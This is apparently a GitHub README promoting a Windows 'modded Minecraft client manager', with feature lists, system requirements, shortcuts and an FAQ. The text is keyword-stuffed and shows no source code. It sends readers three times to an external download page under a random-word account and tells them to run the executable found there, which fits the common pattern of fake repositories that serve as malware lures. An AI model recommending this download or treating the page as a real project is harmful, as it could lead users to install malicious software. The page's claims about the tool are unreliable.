<div align="center">

<img src="assets/banner.svg" width="100%" alt="Minecraft Modded Client banner"/>

# minecraft-modded-client-manager 🧩🔧

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*One control panel for every modded Minecraft client you run — instances, mods, and configs, kept in order.*

<p align="center">
  <a href="https://ThreadSenatorDoor.github.io/minecraft-modded-client-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-0D9488?style=for-the-badge&logo=windows&logoColor=white&labelColor=0F766E" width="550" alt="Download"/>
  </a>
</p>
</div>

---

| Requirement | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| RAM | 4 GB free | 8 GB free |
| Disk | 500 MB + mod storage | SSD, 5 GB free |
| Java | Bundled — none required | — |
| .NET | Bundled — none required | — |
| Internet | Required for mod metadata sync | Broadband |

> [!NOTE]
> No installer wizard, no background services, no registry sprawl. The manager runs from a single folder and stays there.

## 🎮 Overview

**minecraft-modded-client-manager** is a desktop control layer for people who run more than one modded Minecraft client and got tired of manually juggling `mods/` folders, version pins, and forgotten config edits. It sits on top of your existing modded client — Forge, Fabric, Quilt, NeoForge, whatever you've built your world on — and gives you a single pane of glass to organize, launch, and audit everything living inside it.

The Minecraft Modded Client ecosystem in 2026 is bigger and messier than ever: shader packs conflict with performance mods, dependency chains break silently between Minecraft snapshots, and a single misplaced `.jar` can send your log file into a wall of red text. This tool exists because modpack curation shouldn't require a spreadsheet and a prayer. It was built by players who maintain multiple profiles — a survival client, a performance-tuned client, a shader showcase client — and needed a way to switch between them without re-downloading half the internet each time.

Whether you're a solo tinkerer stacking optimization mods on top of a modded Minecraft client, or a server admin distributing a curated pack to a dozen friends, this manager is aimed at removing the friction between "I want to play" and "why won't this launch." It's not a launcher replacement — it's the missing organizational layer launchers never bothered to build.

<p align="center">

<a href="https://ThreadSenatorDoor.github.io/minecraft-modded-client-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-0D9488?style=for-the-badge&logo=windows&logoColor=white&labelColor=0F766E" width="550" alt="Download"/>
  </a>

</p>

---

## ⚙️ What It Actually Does

- **Profile isolation** — every modded Minecraft client instance gets its own sandboxed mod folder, config set, and resource pack stack. Nothing bleeds between profiles.

- **Conflict radar** — scans loaded mods for known ID collisions, duplicate dependency versions, and mixin clashes before you hit launch, not after a crash log.

- **One-click mod toggling** — enable or disable individual mods per profile without deleting or renaming files. Toggled mods are parked, not lost.

- **Version pinning** — lock a profile to a specific Minecraft version and loader build so an unrelated update doesn't quietly break your setup overnight.

- **Config snapshotting** — save the exact state of a profile's configs and roll back instantly if a new mod update wrecks your settings.

- **Bulk import** — drag in an existing `mods/` folder from any modded Minecraft client and the manager fingerprints and catalogs it in seconds.

- **Launch argument presets** — save custom JVM memory allocations and flags per profile, so your shader-heavy client doesn't share RAM limits with your lightweight one.

- **Log triage view** — crash logs get parsed and the offending mod is flagged at the top, instead of you scrolling 4,000 lines looking for `Caused by:`.

> [!TIP]
> Keep a "baseline" profile with zero optional mods. When something breaks elsewhere, compare against baseline first — it cuts debugging time dramatically.

<details>
<summary><strong>📦 Supported mod loaders & formats</strong></summary>

<br/>

| Loader | Status | Notes |
|---|---|---|
| Forge | Full support | Legacy and modern versions |
| Fabric | Full support | Includes Quilt-compatible mods |
| NeoForge | Full support | Auto-detected via manifest |
| Quilt | Full support | Fabric API shims recognized |
| Vanilla (no loader) | Read-only view | For comparison profiles only |

Resource packs, shader packs, and datapacks are tracked per-profile alongside mods — nothing is loader-exclusive in the catalog view.

</details>

---

## 🚀 Getting Started

1. Hit the download button above — it routes to the project landing page, not a direct binary link.

2. Extract the archive anywhere with write access — desktop, external drive, doesn't matter.

3. Run the executable. First launch scans for existing modded Minecraft client folders automatically.

4. Create your first profile, point it at a `mods/` directory (or start empty), and launch.

> [!IMPORTANT]
> Run the manager from a folder you own outright. Program Files and other protected directories can silently block config writes without any visible error.

<details>
<summary><strong>🧭 How It Works — architecture walkthrough</strong></summary>

<br/>

The manager operates as a thin orchestration layer above your existing modded Minecraft client installs. It never touches Mojang's core files directly — it manages the mod/config layer that sits alongside them.

1. **Discovery** — on launch, it scans common install paths and any manually added directories for loader signatures.

2. **Cataloging** — every mod jar is fingerprinted (name, version, hash) and indexed into a local profile database.

3. **Validation** — dependency graphs are built per profile; missing or conflicting requirements are flagged before launch is even attempted.

4. **Isolation** — each profile's active mod set is symlinked into a working directory unique to that profile, keeping the source library untouched.

5. **Launch handoff** — the manager assembles JVM args and hands control to the loader's own launch process, then steps back to log-watch mode.

```mermaid
flowchart LR
Discover --> Catalog --> Validate --> Isolate --> Launch
```

</details>

---

## 🖥️ System Requirements

<details>
<summary><strong>Full requirement breakdown</strong></summary>

<br/>

| Component | Detail |
|---|---|
| Operating System | Windows 10 or 11, 64-bit only |
| Processor | Any x64 CPU from the last 8 years |
| Memory | 4 GB minimum, more if running heavy shader/perf modpacks |
| Storage | 500 MB for the manager itself; mod libraries scale with usage |
| Dependencies | None — Java runtime and .NET components are bundled |
| Permissions | Standard user account; no admin rights required |
| Network | Needed only for mod metadata lookups, not for core function |

![Status](https://img.shields.io/badge/status-actively_maintained-brightgreen?style=flat-square) ![Build](https://img.shields.io/badge/build-stable-blue?style=flat-square) ![Arch](https://img.shields.io/badge/arch-x64-lightgrey?style=flat-square)

</details>

> [!WARNING]
> 32-bit Windows is not supported and will not be. The bundled runtime components require a 64-bit environment.

---

## 🛠️ Troubleshooting

<details>
<summary><strong>Common questions, real answers</strong></summary>

<br/>

**Q: My modded client launches but crashes immediately after showing the Mojang splash screen.**
A: Check the log triage view first — it almost always flags a mixin conflict or a mod built for the wrong Minecraft version.

**Q: The manager doesn't detect my existing mod folder.**
A: Add it manually via bulk import. Auto-detection only scans standard launcher paths, not custom or portable install locations.

**Q: A config snapshot rollback didn't restore everything.**
A: Snapshots capture config files only, not save data or resource pack selections — those are tracked separately by design.

**Q: Two profiles seem to be sharing memory settings.**
A: Launch argument presets are per-profile but can be linked. Check the profile's settings panel for a shared-preset indicator.

**Q: Mods show as "unverified" in the catalog.**
A: This means the hash doesn't match any known registry entry — common for dev builds or manually compiled mods. It's informational only, not a block.

**Q: The tool won't write to my mods directory.**
A: You're likely running from a protected system folder. Move the manager to a user-writable location.

</details>

---

## 🎨 Interface & Controls

<details>
<summary><strong>Shortcuts, themes, settings</strong></summary>

<br/>

| Shortcut | Action |
|---|---|
| `Ctrl + N` | New profile |
| `Ctrl + L` | Launch selected profile |
| `Ctrl + Shift + S` | Snapshot current config state |
| `Ctrl + F` | Search mod catalog |
| `Ctrl + D` | Duplicate profile |
| `F5` | Rescan mod directories |
| `Esc` | Cancel active dialog |

**Themes** — Light, Dark, and a high-contrast mode built for long log-reading sessions.

**Settings worth knowing about:**

> - Auto-snapshot before every launch (off by default, recommended once you have a stable setup)
>
> - Configurable JVM memory ceiling, per profile
>
> - Log verbosity slider — from "just the crash" to "everything"

</details>

---

## 🤝 Contributing & Community

Bug reports, mod-compatibility notes, and pull requests are all welcome. If you maintain a popular modded Minecraft client pack and hit friction the manager doesn't handle gracefully, open an issue — real-world modpack edge cases shape the roadmap more than anything else.

- Found a loader-specific quirk? File it with your loader version and a log excerpt.

- Want to contribute code? Fork, branch, PR — standard flow, no gatekeeping ceremony.

- Discussions tab is open for setup questions and profile-organization tips from other users.

> [!TIP]
> Attach the log triage export (not the raw log) when filing crash-related issues — it's pre-parsed and gets you a faster answer.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026. Use it, fork it, build on it.

---

## ⚖️ Disclaimer

This project is an independent, community-built utility. It is not affiliated with, endorsed by, or sponsored by Mojang Studios or Microsoft. Minecraft is a trademark of Mojang Studios. All mod compatibility is best-effort — always back up worlds and configs before applying changes to a modded Minecraft client setup.

<p align="center">

<a href="https://ThreadSenatorDoor.github.io/minecraft-modded-client-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-0D9488?style=for-the-badge&logo=windows&logoColor=white&labelColor=0F766E" width="550" alt="Download"/>
  </a>

</p>